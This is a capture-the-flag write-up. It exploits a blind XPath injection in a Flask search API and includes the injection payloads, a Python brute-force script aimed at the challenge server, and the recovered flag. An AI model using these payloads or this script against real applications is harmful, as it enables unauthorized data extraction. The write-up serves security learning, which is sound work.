# Solution 

The challenge provides an xml files with the structure of the xml tree. It will be useful to solve the challenge.
    
## Tweaking the input
    
We can crash the app and trigger the debugger using the value `'` for the *search* variable.  

We get an XPathEval error and the following snippet is returned in the debugger response
```html
<pre class="line before"><span class="ws"></span>@app.route(&quot;/api/search&quot;, methods=[&quot;POST&quot;])</pre>
<pre class="line before"><span class="ws"></span>def search():</pre>
<pre class="line current"><span class="ws">    </span>name = request.json.get(&quot;search&quot;, &quot;&quot;)</pre>
<pre class="line after"><span class="ws">    </span>query = &quot;/military/district/staff[name='{}']&quot;.format(name)</pre>
<pre class="line after"><span class="ws"></span> </pre>
<pre class="line after"><span class="ws">    </span>if tree.xpath(query):</pre>
<pre class="line after"><span class="ws">        </span>return {&quot;success&quot;: 1, &quot;message&quot;: &quot;This millitary staff member exists.&quot;}</pre>
<pre class="line after"><span class="ws"></span> </pre></div>
```

We can focus on the text and make it more readable

```python
@app.route("/api/search", methods=["POST"])
def search():
    name = request.json.get("search", "")
    query = "/military/district/staff[name='{}']".format(name)
    if tree.xpath(query):
        return {"success": 1, "message": "This millitary staff member exists."}
    return {"failure": 1, "message": "This millitary staff member doesn't exist."}
```

## Blind XPath injection

### Detect vulnerability

As we can see no input is sanitized nor escaped.  
The output of the search is boolean.  

The flag is in the **selfDestructCode** tags and not all members have it.  
(In the leaderboard we have a couple of names we can try.)

We actually have injection. The following query returns that the member exist:
```
ll'] or /military/district/staff[name='Straorg
```
    
We now have to find a way to extract all the flag snippets.  
    
    
Seems that the player **Straorg** doesn't have the **selfDestructCode** because the following query return false
- `Straorg'][selfDestructCode] or /military/district/not[not='not`. The member after the `or` is just used to create a working xpath query.
With the same approach we confirm that none of the players in the leaderboard has the tag we're looking for.

### Exploit blind injection
We can write our own bruteforcer to leak the flag one byte at a time.
    
`ciao'] or /military/district/staff[selfDestructCode] or /military/district/not[not='not`. It returns true, meaning that there are members with the selfDestructCode set (as expected). Finding the name of these members is not actually needed.  
We can bruteforce the content of the first **selfDestructCode** occurrence and get part of the flag. Then repeat for the 2nd occurrence and so on.  

```python
import requests                                                              


TARGET_URL = 'http://138.68.178.56:30205'
ALPH = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&()+,-./:;<=>?@[\]^_`{|}~"

FLAG = ""


def try_guess(c,occurrence):
    query = "ciao'] or starts-with((/military/district/staff/selfDestructCode)[{}],'{}') or /military/district/not[not='not".format(occurrence,c)
    r = requests.post(TARGET_URL+'/api/search', json = {
        "search": query,
    })
    return "success" in r.text


for i in range(1,4):
    print('Bruteforcing selfDestructCode ',i)
    temp=""
    while True:
        found = False
        for c in ALPH:
            a = try_guess(temp+c,i)
            if a:
                FLAG += c
                temp += c
                found = True
                print(f"Flag so far: {FLAG}")
        if not found:
            break
```
Some notes:
- We guess one character at a time.  
- The `i` variable represent the current *selfdestructCode* to bruteforce.  
- The bruteforce component of the query is `starts-with((/military/district/staff/selfDestructCode)[{}],'{}')`, the other 2 remaining expressions always return False and are only used to allow the injection of our malicious code. 
- Damn `$` sign! It was not in the initial alphabet. It took a while to figure it out.



Flag: `CHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}`

